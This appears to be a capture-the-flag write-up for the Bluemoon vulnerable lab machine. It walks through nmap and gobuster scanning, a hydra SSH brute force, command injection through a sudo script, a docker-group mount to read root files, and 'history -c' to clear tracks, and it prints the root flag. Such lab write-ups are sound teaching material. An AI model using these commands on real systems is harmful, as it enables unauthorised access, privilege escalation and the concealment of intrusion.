# Vulnerable-Machine-Bluemoon
<div class="joplin-table-wrapper"><table><tbody><tr><td><p><strong>Stage</strong></p></td><td><p><strong>Tools / Action</strong></p></td><td><p><strong>Commands / Artifacts</strong></p></td></tr><tr><td><p>Reconnaisance</p></td><td><p>netdiscover / nmap</p></td><td><p>Nmap -sn 192.168.56.0/24 (Found target at 192.168.56.101)</p></td></tr><tr><td><p>Scanning</p></td><td><p>nmap (Port/Service) / gobuster (Web)</p></td><td><ol><li>Nmap -sC -sV 192.168.56.101</li><li>gobuster dir -u <a href="http://192.168.56.101">http://192.168.56.101</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</li></ol></td></tr><tr><td><p>Gaining Access</p></td><td><p>Brute Force / SSH / Command Injection</p></td><td><ol><li>hydra -l robin -P p_lists.txt ssh://192.168.56.101</li><li>ssh <a href="mailto:robin@192.168.56.101">robin@192.168.56.101</a></li><li>sudo -u jerry /home/robin/project/feedback.sh</li></ol></td></tr><tr><td><p>Escalate Privileges</p></td><td><p>Group Enumeration / Docker Exploitation</p></td><td><ol><li>id (Found Jerry in docker group)</li><li>docker run -v /:/mnt –rm -it alpine cat /mnt/root/root.txt</li></ol></td></tr><tr><td><p>Maintain Access</p></td><td><p>Capture Flags (Proof of Access)</p></td><td><ol><li>cat /home/jerry/user2.txt</li><li>Root Flag: F14g{r00t-H4ckTh3P14nt0nc34g41n}</li></ol></td></tr><tr><td><p>Clear Tracks</p></td><td><p>History Deletion / Session Termination</p></td><td><p>history -c</p></td></tr></tbody></table></div>

1.  **RECONNAISANCE**

- netdiscover

Target - 192.168.56.101

- nmap -sn 192.168.56.0/24

\-sn: Ping Scan / No Port Scan

1.  **SCANNING**

- nmap -sC -Sv -Pn -vv 192.168.56.101

Discovered Port 21 (ftp) and Port 22 (SSH) were open

- sudo nmap -p- -T4 192.168.56.101

Discovered Port 80 (HTTP) was open

- gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Discovered a directory called hidden_text

When opened the hidden_text page, a Thank You… link was provided

When clicked on the link, it gave a QR code

I used a QR online decoder to decode the QR and gained the user credentials.

1.  **GAIN ACCESS**

Login to FTP with the given credentials and list down the files (information.txt and p_lists.txt).

View the information.txt file.

View the p_lists.txt file where I got a list of possible passwords.

- hydra -l robin -P p_lists.txt ssh://192.168.56.101

Use the hydra to crack the password from the possible password lists.

- ssh robin@192.168.56.101

Use ssh to login as Robin.

Obtained the first flag.

Use the sudo -l to list down what the user can do.

- sudo -u jerry /home/robin/project/feedback.sh

Use a vulnerable sudo script for vertical privilege escalation from robin to jerry to view the feedback.sh file.

1.  **MAINTAIN ACCESS**

- cat /home/jerry/user2.txt

Type cat /home/jerry/user2.txt in the feedback section. Then, we obtained the second flag from home directory of jerry.

1.  **ESCALATE PRIVILEGES**

- id
- docker run -v /:/mnt –rm -it alpine cat /mnt/root/root.txt

Use the id to check jerry’s profile and discovered he belong to the docker group. Then I used a docker command to trick the system into letting me see the forbidden Root folder which let me read the final flag.

1.  **CLEAR TRACKS**: history -c
